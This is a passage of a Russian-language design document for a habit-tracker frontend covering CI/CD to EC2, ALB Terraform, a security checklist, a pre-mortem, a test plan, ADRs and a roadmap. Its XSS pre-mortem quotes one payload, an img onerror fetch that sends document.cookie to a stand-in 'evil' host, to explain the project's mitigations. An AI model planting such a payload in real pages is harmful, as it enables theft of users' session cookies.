            if curl -fsS --max-time 3 "https://$DOMAIN/health" >/dev/null 2>&1; then
              echo "healthy after ${i} attempts"
              exit 0
            fi
            sleep 3
          done
          echo "::error::ALB health check failed after 60s"
          exit 1

  rollback:
    if: failure() && needs.deploy.result == 'failure'
    needs: deploy
    runs-on: ubuntu-latest
    steps:
      - name: Rollback to previous SHA
        uses: appleboy/ssh-action@v1.2.0
        with:
          host: ${{ secrets.EC2_HOST }}
          username: ${{ secrets.EC2_USER }}
          key: ${{ secrets.EC2_SSH_KEY }}
          script: |
            set -euo pipefail
            export NVM_DIR="$HOME/.nvm"
            source "$NVM_DIR/nvm.sh"
            nvm use default
            cd /var/www/ht-frontend
            PREV=$(cat .previous_sha)
            git reset --hard "$PREV"
            npm ci --include=dev
            npm run build
            pm2 reload ecosystem.config.cjs --update-env
```

Ключевые решения:

- **CI и Deploy — два job'а**, deploy не стартует пока CI не прошёл.
- **`concurrency` + `cancel-in-progress: false`** — параллельные пуши не наступят на пятки.
- **`script_stop: true`** + `set -euo pipefail` — любая команда падает → весь шаг fail → rollback.
- **`pm2 reload` вместо `restart`** — zero-downtime swap.
- **`.previous_sha`** — простейший снапшот для отката.
- **Health check после деплоя** — валидирует через публичный домен (через ALB и DNS).

### 7.5. Что хранить где

| Где                                        | Секрет/переменная                      | Назначение                |
| ------------------------------------------ | -------------------------------------- | ------------------------- |
| GitHub Secrets                             | `EC2_HOST`                             | публичный DNS или EIP EC2 |
| GitHub Secrets                             | `EC2_USER`                             | `deploy`                  |
| GitHub Secrets                             | `EC2_SSH_KEY`                          | приватный ed25519 ключ    |
| GitHub Variables                           | `PUBLIC_DOMAIN`                        | напр. `app.example.com`   |
| EC2 `/var/www/ht-frontend/.env.production` | `VITE_API_BASE_URL`, `VITE_SENTRY_DSN` | публичные envs для Vite   |
| GitHub Deploy Keys                         | публичный SSH-ключ EC2 deploy-юзера    | read-only доступ к репо   |

`.env*` файлы не коммитятся (`.gitignore`), создаются вручную при первом setup.

### 7.6. ALB / target group / listener

```hcl
# Target group
resource "aws_lb_target_group" "ht_frontend" {
  name        = "ht-frontend-tg"
  port        = 8000
  protocol    = "HTTP"
  vpc_id      = var.vpc_id
  target_type = "instance"

  deregistration_delay = 20

  health_check {
    enabled             = true
    path                = "/health"
    matcher             = "200"
    interval            = 15
    timeout             = 5
    healthy_threshold   = 2
    unhealthy_threshold = 3
    protocol            = "HTTP"
  }
}

# HTTPS listener
resource "aws_lb_listener" "https" {
  load_balancer_arn = aws_lb.public.arn
  port              = 443
  protocol          = "HTTPS"
  ssl_policy        = "ELBSecurityPolicy-TLS13-1-2-2021-06"
  certificate_arn   = var.acm_certificate_arn

  default_action {
    type             = "forward"
    target_group_arn = aws_lb_target_group.ht_frontend.arn
  }
}

# HTTP → HTTPS redirect
resource "aws_lb_listener" "http_redirect" {
  load_balancer_arn = aws_lb.public.arn
  port              = 80
  protocol          = "HTTP"
  default_action {
    type = "redirect"
    redirect {
      port        = "443"
      protocol    = "HTTPS"
      status_code = "HTTP_301"
    }
  }
}

# Security group EC2: ALLOW 8000 только от ALB SG
resource "aws_security_group_rule" "ec2_from_alb_8000" {
  type                     = "ingress"
  from_port                = 8000
  to_port                  = 8000
  protocol                 = "tcp"
  security_group_id        = aws_security_group.ec2.id
  source_security_group_id = aws_security_group.alb.id
}
```

`/health` endpoint — статический файл `public/health` с содержимым `ok`, попадает в `dist/health` после билда.

### 7.7. Zero-downtime tricks

1. **`pm2 reload`** для одного инстанса даёт <500ms окно.
2. **Cluster mode** — `instances: 2, exec_mode: 'cluster'`. Строгий zero-downtime.
3. **ALB deregistration delay = 20s** — при рестарте старый instance остаётся в `draining`.
4. **`kill_timeout`** в PM2 даёт `serve` дочитать активные responses перед SIGKILL.

### 7.8. Откат

1. **Авто через `rollback` job** (см. workflow) — на failure health-check возвращает прошлый SHA.
2. **Вручную через workflow_dispatch:** добавить input `target_sha` и `git reset --hard $target_sha`.
3. **Snapshot artifact:** хранить `dist.tar.gz` в S3 на каждый деплой; rollback = распаковка артефакта. На MVP не нужно.

### 7.9. Observability

| Сигнал                 | Где                                        | Что делать                                                |
| ---------------------- | ------------------------------------------ | --------------------------------------------------------- |
| Stdout/stderr `serve`  | `/var/log/ht-frontend/out.log`, `err.log`  | `pm2 logs ht-frontend`, ротация pm2-logrotate             |
| Health-check failures  | ALB CloudWatch metric `UnHealthyHostCount` | CloudWatch alarm → SNS → email/slack                      |
| 5xx %                  | ALB metric `HTTPCode_Target_5XX_Count`     | CloudWatch alarm на > 1% за 5 минут                       |
| Frontend exceptions    | Sentry (`@sentry/react`)                   | автоинит из `VITE_SENTRY_DSN`, release = `VITE_BUILD_SHA` |
| Web Vitals             | Sentry Performance / web-vitals lib        | dashboard в Sentry                                        |
| CI duration / failures | GitHub Actions UI + Slack webhook (опц.)   | алерт на 2+ подряд fail на main                           |

### 7.10. Безопасность чек-лист

- [ ] SSH доступ к EC2 — только по ключу, `PasswordAuthentication no` в `/etc/ssh/sshd_config`.
- [ ] GitHub Actions secret `EC2_SSH_KEY` — отдельный ключ только для деплоя, без passphrase.
- [ ] EC2 security group: 22 (SSH) — только с офисного IP / bastion; 8000 — только от ALB SG; 443/80 — не открыты на EC2 напрямую.
- [ ] Deploy-юзер `deploy` без sudo (или sudo только на конкретные команды).
- [ ] ACM-сертификат на ALB, TLS 1.2+ через `ELBSecurityPolicy-TLS13-1-2-2021-06`.
- [ ] HTTP → HTTPS 301 редирект на ALB.
- [ ] CSP-заголовки через `serve --config serve.json`:
  ```json
  {
    "headers": [
      {
        "source": "**/*",
        "headers": [
          { "key": "X-Content-Type-Options", "value": "nosniff" },
          { "key": "X-Frame-Options", "value": "DENY" },
          { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
          { "key": "Permissions-Policy", "value": "camera=(), microphone=(), geolocation=()" },
          { "key": "Strict-Transport-Security", "value": "max-age=31536000; includeSubDomains" }
        ]
      }
    ]
  }
  ```
- [ ] `.env*` и приватные ключи не попадают в `dist/` — Vite в bundle инлайнит только `VITE_*` envs.
- [ ] CloudWatch logs retention ≥ 30 дней.

### 7.11. Локальный smoke перед коммитом

`package.json` scripts:

```json
{
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview --port 8000",
    "typecheck": "tsc --noEmit",
    "lint": "eslint . --max-warnings=0",
    "test": "vitest",
    "deploy:dry": "npm run typecheck && npm run lint && npm run test -- --run && npm run build"
  }
}
```

`npm run deploy:dry` локально воспроизводит CI gate без push'а.

### 7.12. Вынесено в v1.1 / nice-to-have

- Переход с `serve` на **nginx** на EC2 (precompressed assets, cache headers, gzip/br fallback).
- **CloudFront** перед ALB → cache static assets, ниже latency глобально.
- **Build на CI**, rsync только `dist/` → EC2 (экономит RAM на инстансе, убирает npm ci на проде).
- **Blue/Green через два target group** + переключение listener default_action — настоящий zero-downtime + мгновенный rollback.
- **GitHub OIDC** вместо long-lived SSH key — IAM-role на runner, более безопасно.

---

## 8. Pre-mortem

**Сценарий 1: «OAuth токены утекли через XSS.»**
Причина: где-то в проекте появился `dangerouslySetInnerHTML` с пользовательским content (заметки к habit). Атакующий вставляет `<img onerror=fetch('//evil?'+document.cookie)>`. Но cookie httpOnly → токен недоступен; CSRF блокируется SameSite=Lax. Mitigation: всё пользовательское рендерим как текст, DOMPurify только если когда-нибудь добавим markdown.

**Сценарий 2: «Деплой убил прод посередине.»**
Причина: `npm ci` упал по OOM (t3.small имеет 2GB), процесс умер, PM2 рестартовать нечего. Mitigation: (a) собирать в GH Actions, переносить только `dist` через rsync; (b) или `swapfile` на EC2; (c) `pm2 reload` вместо `restart` — zero-downtime; (d) если build падает — pipeline ломается до touch EC2.

**Сценарий 3: «TZ-баг: отметка “вчера” засчитывается на сегодня.»**
Причина: используем `new Date().toISOString().slice(0,10)` — это UTC, для пользователей восточнее GMT может дать чужой день. Mitigation: единый helper `getLocalDateISO()` в `shared/lib/date.ts`, в формах — `dayjs().format('YYYY-MM-DD')`; на бэке принимать дату в формате `YYYY-MM-DD` без time-зоны.

---

## 9. Test plan

| Уровень            | Что покрываем                                                                                               | Инструменты        |
| ------------------ | ----------------------------------------------------------------------------------------------------------- | ------------------ |
| **Unit**           | date helpers, streak-рендеринг, zod schemas, утилиты cn/format                                              | Vitest             |
| **Component**      | HabitCard (toggle entry), HabitForm (валидация), Heatmap (рендер по фикстуре entries)                       | Vitest + RTL       |
| **Integration**    | Полный flow «открыл Today → отметил привычку → стрик +1» с MSW; auth guard перенаправляет на /login при 401 | Vitest + RTL + MSW |
| **E2E (post-MVP)** | Login (mock OAuth), создание habit, отметка, переключение темы/языка                                        | Playwright         |
| **Observability**  | Sentry SDK с release tagging из CI; web-vitals в console на dev, в Sentry performance на prod               | `@sentry/react`    |

Coverage gates: на CI обязательны typecheck, lint, unit + component tests. Покрытие не гейтим числом, но запрещаем мерж при падении любого теста.

---

## 10. Roadmap

| #      | Milestone               | Содержание                                                                             | Оценка  |
| ------ | ----------------------- | -------------------------------------------------------------------------------------- | ------- |
| **M0** | Bootstrap               | Vite+TS, Tailwind v4, shadcn init, TanStack Router skeleton, базовый layout, `/health` | 0.5 дня |
| **M1** | Auth                    | BFF login flow, `/login`, `useAuth`, guard, logout                                     | 1 день  |
| **M2** | Habits CRUD             | API hooks, формы, list, archive                                                        | 1.5 дня |
| **M3** | Today + entries         | Чекбоксы, optimistic mark/unmark                                                       | 1 день  |
| **M4** | Streaks + Heatmap       | StreakStat, Heatmap-компонент, страница `/habits/:id`                                  | 1.5 дня |
| **M5** | Stats dashboard         | recharts, агрегации                                                                    | 1 день  |
| **M6** | Theme + i18n + settings | next-themes, i18next, страница настроек                                                | 0.5 дня |
| **M7** | CI/CD + EC2             | GH Actions, PM2 на EC2, ALB target group, health check                                 | 1 день  |
| **M8** | Polish                  | Sentry, web-vitals, ошибки/empty states, a11y-проверка                                 | 0.5 дня |

**Итого MVP:** ~8 дней соло, ~5 дней в 2 человека.

---

## 11. ADR

### ADR-1: Vite + TanStack Router + TanStack Query + Zustand

- **Decision:** комбинация четырёх библиотек как фундамент.
- **Drivers:** time-to-MVP, type-safety, разделение server/client state.
- **Alternatives:** Next.js (overhead SSR не нужен — нет SEO), Redux Toolkit (boilerplate), только Zustand (нет кэша).
- **Why chosen:** минимальный стек, каждая либа имеет одну ответственность; экосистема shadcn/ui тестирована именно с этим стеком.
- **Consequences:** при необходимости SSR/SEO позже — миграция на Next.js потребует переезда роутера; Zustand persist для UI prefs нужно настроить.
- **Follow-ups:** оценить переход на TanStack Start при появлении requirement на SSR.

### ADR-2: BFF-паттерн вместо PKCE на фронте

- **Decision:** бэкенд проводит OAuth-обмен и отдаёт httpOnly cookie, фронт не видит токенов.
- **Drivers:** безопасность (#2 driver), simplicity на фронте.
- **Alternatives:** PKCE с токеном в memory + refresh в httpOnly cookie; токен в localStorage (отклонено как XSS-уязвимое).
- **Why chosen:** XSS-устойчиво по дизайну; нет криптокода на фронте; CSRF закрывается SameSite=Lax + проверка Origin на бэке.
- **Consequences:** требование к бэкенду — реализовать `/auth/google`, `/auth/callback`, `/auth/me`, `/auth/logout`, сессионное хранилище.
- **Follow-ups:** при необходимости mobile-клиента может понадобиться PKCE.

### ADR-3: PM2 + `serve` на EC2:8000 (v1), nginx (v1.1)

- **Decision:** на MVP — PM2 запускает `serve dist -s -l 8000`; в v1.1 — миграция на nginx.
- **Drivers:** простота операции, время до первого деплоя.
- **Alternatives:** nginx сразу (больше yak-shaving на старте); чистый node с `express.static` (нет преимуществ перед `serve`).
- **Consequences:** под значимой нагрузкой `serve` менее эффективен, нет gzip/brotli на лету (Vite даёт precompressed assets — частично нивелирует).
- **Follow-ups:** переезд на nginx после первых метрик нагрузки.

### ADR-4: feature-folders вместо FSD

- **Decision:** упрощённая фичевая структура `src/features/*` + `src/shared/*`.
- **Drivers:** time-to-MVP, малая команда.
- **Alternatives:** полный FSD, layered.
- **Consequences:** при росте до 10+ фич может понадобиться выделение `entities` / `widgets` слоёв.

### ADR-5: Native EC2-процесс под PM2, без Docker

- **Decision:** деплой через SSH + git pull + npm build + PM2 reload. Контейнеризация отложена.
- **Drivers:** простота операции, отсутствие текущей инфраструктуры под образы (ECR/EKS), быстрый старт.
- **Alternatives:** Docker + ECS/Fargate; Docker + ECR + EC2 docker-compose; serverless static hosting (S3+CloudFront).
- **Why chosen:** минимум движущихся частей, явный pipeline без registry; ALB и EC2 уже выбраны.
- **Consequences:** ручное управление зависимостями и Node-версией на EC2; нет immutable artifact'а (есть только git SHA + `dist`); масштабирование требует AMI/AutoScaling.
- **Follow-ups:** перейти на S3+CloudFront для static hosting либо контейнеризировать при росте нагрузки/команды.

---

## 12. Open questions

1. **Agreement по auth:** готова ли бэкенд-команда реализовать BFF endpoints (`/auth/google`, `/auth/callback`, `/auth/me`, `/auth/logout`)? Если нет — план B = PKCE на фронте.
2. **Timezone-policy:** даты в API — `YYYY-MM-DD` (локальные пользователя) или ISO datetime?
3. **Streak computation:** на бэке (рекомендуется) или на фронте? Если на бэке — нужны эндпоинты `/habits/:id/stats`.
4. **Доменное имя и сертификат:** есть ли уже домен в Route53 + ACM-сертификат на ALB?
5. **EC2 sizing:** t3.small достаточно для MVP? Если build делаем на EC2 — рекомендую t3.medium (или 2GB swap).
6. **Sentry/мониторинг:** есть ли организационный аккаунт?
7. **Repo location:** где живёт GitHub-репозиторий (org/имя) — нужен для deploy keys.
